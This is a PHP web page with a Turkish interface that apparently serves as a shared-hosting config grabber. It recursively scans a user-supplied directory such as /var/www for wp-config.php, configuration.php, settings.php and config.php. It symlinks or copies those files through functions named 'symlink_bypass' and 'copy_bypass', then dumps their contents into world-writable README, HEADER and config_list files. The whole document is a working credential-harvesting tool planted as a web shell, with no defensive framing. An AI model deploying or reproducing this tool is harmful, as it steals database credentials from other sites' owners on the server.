<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Config Dosya Tarayıcı</title>
</head>
<body>

    <h1>Config Dosya Tarayıcı</h1>
    <form method="POST" action=""> 
        <label for="directory">Tarama yapılacak dizin:</label><br>
        <input type="text" id="directory" name="directory" placeholder="/var/www" required><br><br>
        
        <input type="submit" value="Başlat">
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $start_dir = $_POST['directory'];

        set_time_limit(0);
        ini_set('memory_limit', '-1');

        $kayit_dizini = __DIR__ . "/config_files";
        if (!file_exists($kayit_dizini)) {
            mkdir($kayit_dizini, 0777, true);
        }

        $config_files = [
            'wp-config.php',
            'configuration.php',
            'settings.php',
            'config.php'
        ];

        function symlink_bypass($target, $link) {
            if (@symlink($target, $link)) {
                return true;
            } else {
                return false;
            }
        }

        function copy_bypass($source, $dest) {
            if (@copy($source, $dest)) {
                return true;
            } else {
                return false;
            }
        }

        function save_file($kayit_dizini, $file, $file_content, $counter) {
            $readme_path = $kayit_dizini . "/README";
            $header_path = $kayit_dizini . "/HEADER";

            if (file_exists($readme_path)) {
                $readme_path = $kayit_dizini . "/README" . $counter;
            }
            if (file_exists($header_path)) {
                $header_path = $kayit_dizini . "/HEADER" . $counter;
            }

            file_put_contents($readme_path, $file_content, FILE_APPEND);
            file_put_contents($header_path, $file_content, FILE_APPEND);

            $txt_path = $kayit_dizini . "/config_list" . $counter . ".txt";
            file_put_contents($txt_path, $file_content, FILE_APPEND);
        }

        function find_files($dir, $config_files, &$result) {
            $items = @scandir($dir); 
            if (!$items) return;

            foreach ($items as $item) {
                if ($item == "." || $item == "..") {
                    continue;
                }
                $full_path = $dir . DIRECTORY_SEPARATOR . $item;

                if (is_dir($full_path)) {
                    find_files($full_path, $config_files, $result);
                } else {
                    if (in_array(basename($full_path), $config_files)) {
                        $result[] = $full_path;
                    }
                }
            }
        }

        $result = [];
        find_files($start_dir, $config_files, $result);

        $counter = 1;
        if (!empty($result)) {
            echo "<h3>Bulunan Yapılandırma Dosyaları:</h3>";
            echo "<ul>";
            foreach ($result as $file) {
                echo "<li>$file</li>";

                $file_content = file_get_contents($file);
                
                $symlink_target = $kayit_dizini . DIRECTORY_SEPARATOR . basename($file);
                if (!file_exists($symlink_target)) {
                    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') { 
                        if (!symlink_bypass($file, $symlink_target)) {
                            echo "Symlink oluşturulamadı: $file<br>";
                        }
                    } else {
                        if (!copy_bypass($file, $symlink_target)) {
                            echo "Kopyalama yapılamadı: $file<br>";
                        }
                    }
                }

                save_file($kayit_dizini, $file, $file_content, $counter);
                $counter++;
            }
            echo "</ul>";
            echo "Yapılandırma dosyaları başarıyla kaydedildi.";
        } else {
            echo "Herhangi bir yapılandırma dosyası bulunamadı.";
        }
    }
    ?>

</body>
</html>
